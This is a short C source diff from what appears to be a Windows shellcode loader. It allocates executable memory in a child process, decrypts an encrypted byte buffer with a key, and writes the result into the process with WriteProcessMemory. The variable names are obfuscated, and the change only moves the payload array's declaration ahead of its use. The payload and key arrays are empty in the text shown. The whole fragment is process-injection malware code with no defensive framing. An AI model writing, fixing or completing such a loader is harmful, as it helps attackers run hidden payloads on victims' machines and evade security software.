@@ -37,10 +37,9 @@ int main() {
     ctx.ContextFlags = CONTEXT_FULL;
 
     GetThreadContext(pi.hThread, &ctx);
-
+unsigned char itsthecod345[] = {};
     LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    unsigned char ke185hams[] = {};
-    unsigned char itsthecod345[] = {}; 
+    unsigned char ke185hams[] = {}; 
     encaeshello((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));
 
     WriteProcessMemory(pi.hProcess, memlo, itsthecod345, sizeof(itsthecod345), NULL);
